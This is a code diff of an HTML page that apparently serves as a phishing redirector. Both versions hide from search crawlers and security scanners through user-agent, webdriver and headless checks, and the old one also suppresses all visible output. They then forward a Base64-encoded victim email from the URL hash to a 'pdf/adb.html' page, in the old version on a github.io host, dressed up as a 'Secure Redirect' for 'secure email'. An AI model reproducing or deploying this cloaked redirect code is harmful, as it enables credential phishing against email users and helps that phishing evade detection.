@@ -1,120 +1,108 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>System Resources</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="robots" content="noindex, nofollow" />
+  <meta name="googlebot" content="noindex, nofollow" />
+  <title>Secure Redirect</title>
   <style>
     body {
       margin: 0;
       padding: 0;
-      background-color: #f5f5f5;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+      background: #1a202c;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: white;
     }
-    .hidden-content {
-      display: none;
+    .container {
+      text-align: center;
+      max-width: 500px;
+      padding: 20px;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 10px;
+      color: #4a6cf7;
+    }
+    .status {
+      background: #2d3748;
+      padding: 15px;
+      border-radius: 8px;
+      margin: 15px 0;
+      font-size: 14px;
+    }
+    .loader {
+      border: 3px solid #2d3748;
+      border-top: 3px solid #4a6cf7;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
 <body>
-  <div class="hidden-content">
-    <h1>System Resources</h1>
-    <p>Loading system resources, please wait...</p>
+  <div class="container">
+    <h1>Secure Redirect</h1>
+    <div class="status" id="status">Processing secure email...</div>
+    <div class="loader"></div>
   </div>
 
   <script>
-    (function() {
-      // Enhanced bot detection with multiple techniques
-      function detectAutomation() {
-        // User agent check
-        const botPatterns = [
+    (function () {
+      // Bot detection
+      function isBotUserAgent() {
+        const bots = [
           /bot/i, /crawler/i, /spider/i, /crawling/i,
           /google/i, /bing/i, /yahoo/i, /facebook/i,
-          /duckduckgo/i, /baidu/i, /yandex/i, /headless/i,
-          /phantom/i, /puppeteer/i, /selenium/i, /playwright/i
+          /duckduckgo/i, /baidu/i, /yandex/i
         ];
-        
-        if (botPatterns.some(pattern => pattern.test(navigator.userAgent))) {
-          return true;
-        }
-        
-        // Automation properties check
-        const automationProps = [
-          'webdriver', '__webdriver_evaluate', '__selenium_evaluate',
-          '__fxdriver_evaluate', '__driver_evaluate', '__webdriver_unwrapped'
-        ];
-        
-        if (automationProps.some(prop => prop in navigator)) {
-          return true;
-        }
-        
-        // Plugin and language checks
-        if (navigator.languages.length === 0 || navigator.plugins.length === 0) {
-          return true;
-        }
-        
-        // Screen resolution check (headless often has small dimensions)
-        if (window.screen.width < 300 || window.screen.height < 300) {
-          return true;
-        }
-        
-        // Check for automation-specific objects
-        if (window.document.documentElement.getAttribute('webdriver') ||
-            window.document.documentElement.getAttribute('driver')) {
-          return true;
-        }
-        
-        return false;
+        return bots.some(bot => bot.test(navigator.userAgent));
       }
-      
-      // Generate a secure token
-      function generateToken(length = 24) {
+
+      if (isBotUserAgent()) {
+        document.getElementById('status').textContent = "Access blocked: automated system detected.";
+        document.querySelector('.loader').style.display = "none";
+        return;
+      }
+
+      // Step 1: Get the Base64 email from the current URL (after the #)
+      var encodedEmail = window.location.hash.substring(1); // removes the '#'
+
+      // Fallback if no hash is present
+      if (!encodedEmail) {
+        document.getElementById('status').textContent = "Missing secure email token.";
+        document.querySelector('.loader').style.display = "none";
+        return;
+      }
+
+      // Step 2: Generate a strong random token
+      function generateToken(length = 16) {
         const array = new Uint8Array(length);
         crypto.getRandomValues(array);
         return Array.from(array, b => b.toString(16).padStart(2, "0")).join("");
       }
-      
-      // Get encoded data from hash
-      function getEncodedData() {
-        // Get data from hash (removing the #)
-        if (window.location.hash && window.location.hash.length > 1) {
-          return window.location.hash.substring(1);
-        }
-        
-        return null;
-      }
-      
-      // Execute the redirect with no visual indicators
-      function executeRedirect() {
-        // Check for automation
-        if (detectAutomation()) {
-          // Don't do anything if automation is detected
-          return;
-        }
-        
-        // Get the encoded data
-        const encodedEmail = getEncodedData();
-        
-        if (!encodedEmail) {
-          // No data found, don't redirect
-          return;
-        }
-        
-        // Generate token
-        const token = generateToken();
-        
-        // Build redirect URL - using the correct path structure
-        const randomParam = generateToken(8);
-        const redirectUrl = `https://hareru66.github.io/pdf/adb.html?ref=${randomParam}&token=${token}#email=${encodedEmail}`;
-        
-        // Redirect immediately with no visual feedback
+      var token = generateToken();
+
+      // Step 3: Build the redirect URL
+      var redirectUrl = "pdf/adb.html#email=" + encodedEmail + "&token=" + token;
+
+      // Step 4: Update status and redirect
+      document.getElementById('status').textContent = "Redirecting...";
+      setTimeout(() => {
         window.location.replace(redirectUrl);
-      }
-      
-      // Start the process with a minimal random delay (0-100ms)
-      setTimeout(executeRedirect, Math.floor(Math.random() * 100));
+      }, 1500);
+
     })();
   </script>
 </body>
 </html>
-
